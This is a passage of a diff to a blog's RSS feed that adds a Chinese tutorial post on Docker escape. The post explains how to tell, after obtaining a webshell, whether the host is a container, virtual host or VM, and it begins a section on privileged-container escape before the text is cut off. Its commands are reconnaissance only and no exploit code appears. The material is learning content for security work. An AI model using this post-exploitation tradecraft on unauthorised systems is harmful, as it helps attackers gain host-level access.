@@ -7,7 +7,1010 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>xxxx</copyright>
-        <lastBuildDate>Tue, 31 Mar 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://xxxxctfer.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 05 Apr 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://xxxxctfer.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>docker逃逸学习</title>
+        <link>https://xxxxctfer.github.io/p/docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</link>
+        <pubDate>Sun, 05 Apr 2026 00:00:00 +0000</pubDate>
+        
+        <guid>https://xxxxctfer.github.io/p/docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</guid>
+        <description>&lt;img src="https://xxxxctfer.github.io/images/docker/docker1.png" alt="Featured image of post docker逃逸学习" /&gt;&lt;p&gt;我们来学习一下有关docker逃逸相关的东西，分两个步骤来执行，分别是怎么判断当前shell是docker环境还是主机，有什么特殊机制或框架存在。第二步则是学习怎么去打docker逃逸获得宿主机的权限以及一些应用情况。&lt;/p&gt;
+&lt;h1 id=&#34;环境判断&#34;&gt;环境判断
+&lt;/h1&gt;&lt;p&gt;在拿到webshell的时候，或者是已经变为持续化的后门shell的时候，我们都需要去判断，当前的这个主机是不是docker的，因为docker的局限会大一些，我们更希望拿到宿主机的权限，并且还有可能拿到宿主机下很多docker容器的权限，牵扯更广泛。&lt;/p&gt;
+&lt;h2 id=&#34;常见虚拟环境&#34;&gt;常见虚拟环境
+&lt;/h2&gt;&lt;p&gt;因为docker是属于虚拟的环境，但是虚拟环境不止这一种，这里简单介绍一下常见的。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;虚拟主机&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;虚拟主机是指在一台物理服务器上运行的多个虚拟主机实例，每个虚拟主机实例都拥有自己的环境和资源，通常用于提供Web托管服务&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：虚拟主机（Virtual Hosting）和虚拟机（Virtual Machine）是两个不同的概念，虚拟机是一个完整的虚拟化系统，包括操作系统、软件和硬件，可以在单个物理服务器上运行多个操作系统实例&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Docker&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Docker是一种虚拟化技术，利用容器化的方式将应用程序及其依赖项打包成独立、轻量级的环境，实现快速部署、高效运行和跨平台运行的功能&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;K8s&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Kubernetes（通常简写为K8s）是一个开源的容器编排平台，通过自动化部署、扩展和管理容器化应用，实现高可用性、弹性和灵活性。它提供了集群管理、服务发现、负载均衡等功能，让用户可以更轻松地管理容器化应用的生命周期&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;大概就是这几种，虚拟机没介绍是因为跟虚拟主机做对比了，就没介绍了。
+还是多介绍一下吧，虚拟机是完全虚拟，所有的东西都是从主机上面分配给虚拟机的，环境都是虚拟的，但是可以作为一个完整的主机存在。但是大多数情况属于没什么用的东西，大部分用来做蜜罐了，没啥意义。虚拟主机是单纯分了一块空间去运行web程序，这种是我们可以去测试的，可能可以拿下物理机的权限，可以去分辨。&lt;/p&gt;
+&lt;h2 id=&#34;判断思路&#34;&gt;判断思路
+&lt;/h2&gt;&lt;p&gt;虽然说是总共有四种虚拟环境，但是还是比较好辨认的，下面根据不同的环境介绍一下怎么去进行判断。&lt;/p&gt;
+&lt;h3 id=&#34;docker&#34;&gt;docker
+&lt;/h3&gt;&lt;p&gt;我们这里用一个之前搭建的题目，进docker环境去看打一些命令都有什么作用。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;进docker环境：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it 容器名 /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;开好docker环境之后我们就可以测了：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;最常见，也最容易隐藏的：
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls / -al &lt;span class=&#34;c1&#34;&gt;#会发现有一个.dockerenv文件在根目录下&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker1.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后还有一些docker的特征，接着来看看。
+在 Linux 系统（包括 Docker 容器基于的 Linux 内核环境）中，&lt;code&gt;/proc&lt;/code&gt; 是一个虚拟文件系统，其中的文件包含了有关进程的各种信息。对于容器内的进程，&lt;code&gt;/proc/1/cgroup&lt;/code&gt; 文件内容会体现出与容器相关的一些特征。我们就可以去看一下这个文件。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /proc/1/cgroup
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker2.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;就可以看到很多docker的东西。我们也可以看看宿主机的这个文件是什么。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker3.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到就没docker的东西了。
+还有当启动 Docker 容器时，Docker 会自动设置一些环境信息在容器内部，通过检查这些特定的环境配置是否存在，也可以作为辅助判断环境情况的一种手段。比如hostname可能显示docker id&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker4.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;大体应该就这些方法，主要还是前面两种更准确一点。&lt;/p&gt;
+&lt;h3 id=&#34;虚拟主机&#34;&gt;虚拟主机
+&lt;/h3&gt;&lt;p&gt;我这里用kali搭建了一下，搭建过程如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl start apache2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; apache2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo mkdir -p /var/www/site1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo mkdir -p /var/www/site2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;site1&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sudo tee /var/www/site1/index.html
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;site2&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sudo tee /var/www/site2/index.html
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;site1:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo tee /etc/apache2/sites-available/site1.conf &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;&amp;lt;VirtualHost *:80&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    ServerName site1.test
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    DocumentRoot /var/www/site1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;&amp;lt;/VirtualHost&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;site2:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo tee /etc/apache2/sites-available/site2.conf &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;&amp;lt;VirtualHost *:80&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    ServerName site2.test
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    DocumentRoot /var/www/site2
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;&amp;lt;/VirtualHost&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo a2ensite site1.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo a2ensite site2.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo systemctl restart apache2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo tee -a /etc/hosts &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;127.0.0.1 site1.test
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;127.0.0.1 site2.test
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后就可以看到搭建好的情况。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker6.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，现在就搭建好了，然后思考一下怎么进入他们的shell。但是这个是用外部的访问来看有没有各种web服务端虚拟主机。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker7.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到，三个访问回显的内容不一样，主要就是加了HOST。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl http://127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host: site1.test&amp;#34;&lt;/span&gt; 127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host: site2.test&amp;#34;&lt;/span&gt; 127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;虚拟机&#34;&gt;虚拟机
+&lt;/h3&gt;&lt;p&gt;虚拟机虽然是一整个虚拟的操作系统，但是根据用的软件不同，多多少少会有一些标志可以去找，比如。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dmesg &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -i virtual
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker5.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;打这个命令出现明显的VMware，或者VirtualBox，KVM，QEMU，Hyper-V，Xen等标志，就可以确定是虚拟机环境了。
+还有一些类似的命令，我就不展示了，可以自己去尝试一下。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;grep -i -E &lt;span class=&#34;s1&#34;&gt;&amp;#39;vmware|virtual|kvm|qemu&amp;#39;&lt;/span&gt; /proc/cpuinfo &lt;span class=&#34;c1&#34;&gt;# CPU信息&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lscpu &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -i hypervisor &lt;span class=&#34;c1&#34;&gt;# 硬件信息&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dmidecode -s system-product-name &lt;span class=&#34;c1&#34;&gt;# BIOS信息&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ip link &lt;span class=&#34;c1&#34;&gt;# MAC 地址&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;上面的都是Linux命令，下面给出一些Windows的命令。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systeminfo &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; findstr /i &lt;span class=&#34;s2&#34;&gt;&amp;#34;vmware virtualbox hyper-v kvm&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic cpu get name
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic diskdrive get caption
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic bios get serialnumber
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;大体上跟上面一样的查询。&lt;/p&gt;
+&lt;h3 id=&#34;k8s&#34;&gt;k8s
+&lt;/h3&gt;&lt;p&gt;这个没找了，搭建了半天环境没搭出来，等之后有时间再补上。&lt;/p&gt;
+&lt;h1 id=&#34;docker逃逸手法&#34;&gt;docker逃逸手法
+&lt;/h1&gt;&lt;p&gt;OK，学习完了怎么判断虚拟环境对应是什么东西，我们回归正题，来学习怎么进行docker逃逸。首先先给个万金油的选择吧，就是工具直接跑，看有什么可以逃逸的。https://github.com/teamssix/container-escape-check，用这个工具，他会自动查询符合哪些docker逃逸的条件，然后直接去攻击即可。但是初学还是不能这么懒狗，自己学习一下怎么搞。&lt;/p&gt;
+&lt;h2 id=&#34;特权模式&#34;&gt;特权模式
+&lt;/h2&gt;&lt;p&gt;特权模式逃逸是最简单有效的逃逸方法之一，当使用以特权模式（privileged参数）启动的容器时，就可以在docker容器内部 通过 mount 命令挂载外部主机磁盘设备，获得宿主机文件的读写权限。这里拉取了ubuntu的18.04版本的镜像，然后用参数开特权容器。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;先创建一个特权容器：
